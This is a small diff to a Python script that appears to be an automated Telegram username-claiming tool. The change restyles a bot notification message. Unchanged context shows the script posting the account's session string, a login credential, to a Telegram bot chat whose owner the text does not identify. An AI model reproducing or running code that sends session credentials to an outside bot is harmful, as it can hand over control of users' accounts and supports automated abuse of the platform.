@@ -26,12 +26,11 @@ while True:
 					try:
 						app.set_username(o)
 						qq+=1
-						op = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=
-𝙵𝙸𝙶𝙷𝚃 𝙵𝙾𝚁 𝚈𝙾𝚄𝚁 𝙳𝚁𝙴𝙰𝙼 
-----------------♡ -•
-𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : @{o}
-𝙲𝙻𝙸𝙲𝙺𝚂 : {qq}
-𝚂𝙰𝚅𝙴 : 𝙰𝙲𝙲𝙾𝚄𝙽𝚃''')
+						op = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=𝑰𝒔 𝒂 𝑵𝒆𝒘 𝒖𝒔𝒆𝒓 𝑩𝒚 : 𝒂𝑩𝒐𝒐𝑫 𝒀𝒂𝑩𝒉 🐊,
+এ〔 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 〕: @{o}
+এ〔 𝑪𝒍𝒊𝒄𝒌𝒔 〕: {qq}
+এ〔 𝑺𝒂𝒗𝒆 〕: 𝑨𝒄𝒄𝒐𝒖𝒏𝒕
+এ〔 𝑪𝒉 〕: @ToGoLang''')
 						app.update_profile(first_name="Hi ?.")
 						se = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=
 •- Account Session : ❲ {session} ❳‌‌''')
